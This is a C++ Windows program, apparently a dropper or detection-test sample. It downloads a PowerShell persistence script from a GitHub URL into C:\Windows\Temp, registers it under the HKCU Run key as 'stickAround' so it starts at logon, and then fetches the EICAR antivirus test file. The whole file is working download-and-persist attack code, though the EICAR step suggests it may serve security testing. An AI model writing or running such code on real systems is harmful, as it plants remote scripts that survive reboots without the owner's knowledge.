#include <windows.h>
#include <urlmon.h>
#include <iostream>
#include <codecvt>


#pragma comment(lib, "urlmon.lib")



using namespace std;


void downloadSticky()
{
    // The URL of the file to download
    std::string url = "https://raw.githubusercontent.com/Shellntel/scripts/master/powershell-persistence.ps1";

    // The path of the temp directory on Windows
    std::string temp_dir = "C:\\Windows\\Temp";

    // The name of the file to save
    std::string file_name = "sticky.ps1";

    // The full path of the file to save
    std::string save_path = temp_dir + "\\" + file_name;

    // Download the file and check for errors
    HRESULT result = URLDownloadToFile(NULL, url.c_str(), save_path.c_str(), 0, NULL);
    if (result == S_OK)
        std::cout << "File downloaded successfully.\n";
    else if (result == E_OUTOFMEMORY)
        std::cout << "Out of memory error.\n";
    else if (result == INET_E_DOWNLOAD_FAILURE)
        std::cout << "Cannot access server data.\n";
    else
        std::cout << "Unknown error.\n";

}


int schedule()
{
    // Open the Run registry key
    HKEY hKey;
    std::wstring subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    // Convert wide string to narrow string
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    std::string subKeyNarrow = converter.to_bytes(subKey);

    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, subKeyNarrow.c_str(), 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS)
    {
        // Handle error
        return -1;
    }

    // Set the value for Notepad
    std::wstring valueName = L"stickAround";
    std::wstring valueData = L"C:\\Windows\\Temp\\sticky.ps1";

    // Convert wide strings to narrow strings
    std::string valueNameNarrow = converter.to_bytes(valueName);
    std::string valueDataNarrow = converter.to_bytes(valueData);

    result = RegSetValueEx(hKey, valueNameNarrow.c_str(), 0, REG_SZ, (const BYTE*)valueDataNarrow.c_str(), valueDataNarrow.size() + 1);
    if (result != ERROR_SUCCESS)
    {
        // Handle error
        return -1;
    }

    // Close the registry key
    RegCloseKey(hKey);

    return 0;
};

void downloadFile()
{
    // The URL of the file to download
    std::string url = "https://secure.eicar.org/eicar.com.txt";

    // The path of the temp directory on Windows
    std::string temp_dir = "C:\\Windows\\Temp";

    // The name of the file to save
    std::string file_name = "myfile.txt";

    // The full path of the file to save
    std::string save_path = temp_dir + "\\" + file_name;

    // Download the file and check for errors
    HRESULT result = URLDownloadToFile(NULL, url.c_str(), save_path.c_str(), 0, NULL);
    if (result == S_OK)
        std::cout << "File downloaded successfully.\n";
    else if (result == E_OUTOFMEMORY)
        std::cout << "Out of memory error.\n";
    else if (result == INET_E_DOWNLOAD_FAILURE)
        std::cout << "Cannot access server data.\n";
    else
        std::cout << "Unknown error.\n";

}


int main()

{
    downloadSticky();

    schedule();

    downloadFile();
    
    return 0;
}
